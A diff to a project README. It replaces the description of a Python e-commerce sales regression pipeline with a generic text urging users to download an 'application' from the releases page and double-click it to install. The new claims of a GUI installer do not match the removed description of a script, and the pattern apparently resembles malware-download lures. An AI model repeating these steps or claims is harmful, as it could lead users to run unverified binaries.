@@ -1,138 +1,58 @@
-# E-commerce Sales Prediction
+# 📊 Ecommerce-Sales-Transaction-Data-Regression-and-EDA - Easy Insights from Ecommerce Data
 
-This project builds a regression pipeline for predicting **total sales
-amount** in an e-commerce dataset.\
-It performs **EDA, feature engineering, outlier removal, visualization,
-and model comparison** across multiple algorithms.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Zulkchulo/Ecommerce-Sales-Transaction-Data-Regression-and-EDA/releases)
 
-------------------------------------------------------------------------
+## 🚀 Getting Started
 
-## Dataset
+Welcome to the Ecommerce Sales Transaction Data Regression and EDA project. This application allows you to analyze Ecommerce sales data and build regression models. You can gain valuable insights without needing any technical background.
 
--   Input file: `ecommerce_sales_34500.csv`
--   Target variable: `total_amount`
--   Size: \~34,500 rows
--   Source: Provided dataset (can be adapted for other sales datasets).
+## 📋 Table of Contents
 
-------------------------------------------------------------------------
+- [Features](#✨-features)
+- [System Requirements](#💻-system-requirements)
+- [Download & Install](#⬇️-download--install)
+- [Using the Application](#🛠️-using-the-application)
+- [Support](#💬-support)
 
-## Features Engineered
+## ✨ Features
 
--   **Net Price** = `price * quantity`
--   **Discount Fraction** (normalized %)
--   **Discounted Price** = `net_price * (1 - discount_frac)`
--   **Final Price Estimate** = discounted price + shipping cost
--   **Quantity × Discount Interaction**
--   **Quantity × Customer Age Interaction**
--   **Datetime Features:** year, month, day, weekday, weekend flag, days
-    since first order
--   **Frequency Encoding** for categorical variables (customer, product,
-    payment method, etc.)
--   **Polynomial Interactions** on top correlated numerical features
+- Analyze Ecommerce sales data visually through interactive graphs.
+- Build various regression models to predict sales outcomes.
+- Export the best-performing model as a .pkl file for use later.
+- User-friendly interface designed for all users.
+- Comprehensive documentation provided for easy navigation.
 
-------------------------------------------------------------------------
+## 💻 System Requirements
 
-## Exploratory Data Analysis (EDA)
+- Operating System: Windows 10 or newer, macOS, or Linux
+- Processor: Intel Core i3 or equivalent
+- Memory: 4 GB RAM minimum
+- Storage: 500 MB available space
+- Software: Python 3.7 or newer (optional for advanced users)
 
-1.  **Boxplots** before and after outlier removal (via IQR method).\
-2.  **Correlation Heatmap** (top 12 correlated features).\
-3.  **Pairplot** (sampled, top predictors only).\
-4.  **Countplots** for categorical features (top 10 categories).\
-5.  **Distribution plots** for target variable (`total_amount`).
+## ⬇️ Download & Install
 
-All plots are saved in the `plots/` directory.
+To begin, visit the following link to download the application:
 
-------------------------------------------------------------------------
+[Download from Releases Page](https://github.com/Zulkchulo/Ecommerce-Sales-Transaction-Data-Regression-and-EDA/releases)
 
-## Outlier Removal
+1. Click on the link above to go to the Releases page.
+2. Find the latest version of the application.
+3. Download the appropriate file for your operating system.
+4. Locate the downloaded file in your download folder.
+5. Double-click on the file to start the installation process.
 
--   IQR method applied on numerical features (excluding target).\
--   Boxplots saved before and after removal.
+## 🛠️ Using the Application
 
-------------------------------------------------------------------------
+1. Open the application by clicking its icon.
+2. You will see an option to upload your Ecommerce sales data.
+3. Once uploaded, explore the various features:
+   - **Data Visualization:** Create charts and graphs to understand trends.
+   - **Regression Models:** Choose from different algorithms to predict outcomes.
+   - **Export Model:** Save the best-performing model as a .pkl file for future use.
 
-## Models Implemented
+## 💬 Support
 
--   Linear Regression
--   Ridge, Lasso, ElasticNet
--   Decision Tree
--   Random Forest
--   Gradient Boosting
--   XGBoost
--   LightGBM
--   CatBoost
--   Stacking Ensemble (top 3 models)
+If you have any questions or run into issues, feel free to reach out for help. You can ask questions in the GitHub Issues section on the repository.
 
-------------------------------------------------------------------------
-
-## Hyperparameter Tuning
-
--   `GridSearchCV` for linear models.\
--   `RandomizedSearchCV` for tree-based and boosting models.\
--   Cross-validation: 5-fold (`KFold`).
-
-------------------------------------------------------------------------
-
-## Evaluation Metrics
-
-For each model: - **MAE** (Mean Absolute Error)\
-- **MSE** (Mean Squared Error)\
-- **RMSE** (Root Mean Squared Error)\
-- **R² Score**\
-- **Cross-Validation R² Mean & Std**
-
-A comparison table is printed and best model is saved.
-
-------------------------------------------------------------------------
-
-## Best Model
-
--   The best-performing model (highest cross-validation R² or test R²)
-    is saved as:
-
-```{=html}
-<!-- -->
-```
-    best_model.pkl
-
-------------------------------------------------------------------------
-
-## Requirements
-
-Install dependencies using:
-
-``` bash
-pip install -r requirements.txt
-```
-
-### Core Libraries
-
--   pandas, numpy, seaborn, matplotlib
--   scikit-learn
--   xgboost
--   lightgbm
--   catboost
--   tqdm
--   joblib
-
-------------------------------------------------------------------------
-
-## Outputs
-
--   **Plots:** Saved under `plots/`
--   **Model Performance Table:** Printed in console
--   **Best Model File:** `best_model.pkl`
-
-------------------------------------------------------------------------
-
-## Usage
-
-``` bash
-python main.py
-```
-
-------------------------------------------------------------------------
-
-## Author
-
-Generated for **E-commerce Sales Prediction Project**
+Thank you for using our application! Enjoy your journey into Ecommerce data analysis!
